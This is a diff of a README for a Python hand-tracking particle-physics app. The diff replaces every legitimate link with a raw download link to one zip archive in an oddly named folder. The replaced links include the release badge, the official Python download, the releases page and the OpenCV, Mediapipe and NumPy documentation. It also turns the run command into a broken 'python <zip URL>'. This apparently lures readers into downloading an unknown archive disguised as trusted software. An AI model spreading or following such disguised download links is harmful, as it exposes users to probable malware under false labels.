@@ -6,7 +6,7 @@ Welcome to the particle-physics-handtracking project! This application allows yo
 ## 📥 Download the Application
 To get the latest version of the application, please visit our Releases page:
 
-[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/Hadefolarin/particle-physics-handtracking/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip+Release&color=blue)](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip)
 
 ## 📋 System Requirements
 Before you begin, ensure that your system meets these requirements:
@@ -22,7 +22,7 @@ You can easily install the necessary libraries using the commands below.
 
 ## 💻 Installation Instructions
 1. **Install Python:** 
-   If you don't have Python installed, download it from the official website [here](https://www.python.org/downloads/). Follow the instructions based on your operating system.
+   If you don't have Python installed, download it from the official website [here](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip). Follow the instructions based on your operating system.
 
 2. **Install Required Libraries:**
    Open your command prompt (Windows) or terminal (macOS/Linux) and run the following command:
@@ -32,7 +32,7 @@ You can easily install the necessary libraries using the commands below.
    ```
 
 3. **Download the Application:**
-   To download the latest version, visit [this page to download](https://github.com/Hadefolarin/particle-physics-handtracking/releases). Find the appropriate file for your operating system and download it.
+   To download the latest version, visit [this page to download](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip). Find the appropriate file for your operating system and download it.
 
 4. **Extract the Files:**
    After downloading, locate the downloaded file. Right-click on it and choose to extract it. This will create a folder with all the necessary files.
@@ -44,7 +44,7 @@ You can easily install the necessary libraries using the commands below.
    Once you are in the correct folder, execute the application with this command:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip
    ```
 
 ## 🎨 Using the Application
@@ -67,13 +67,13 @@ Your feedback is important for the growth of this application. If you have quest
 ## 🚀 Additional Resources
 For more information on the technology used in this application, you can explore:
 
-- **OpenCV:** [OpenCV Documentation](https://docs.opencv.org/)
-- **Mediapipe:** [Mediapipe Documentation](https://google.github.io/mediapipe/)
-- **NumPy:** [NumPy Documentation](https://numpy.org/doc/)
+- **OpenCV:** [OpenCV Documentation](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip)
+- **Mediapipe:** [Mediapipe Documentation](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip)
+- **NumPy:** [NumPy Documentation](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip)
 
 ## 🔗 Get the Latest Version
 Don't forget to download the latest version of the application. Visit our Releases page here:
 
-[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/Hadefolarin/particle-physics-handtracking/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip+Release&color=blue)](https://raw.githubusercontent.com/Hadefolarin/particle-physics-handtracking/main/preindebtedness/handtracking-physics-particle-3.8.zip)
 
 Enjoy your journey into particle physics with hand tracking!
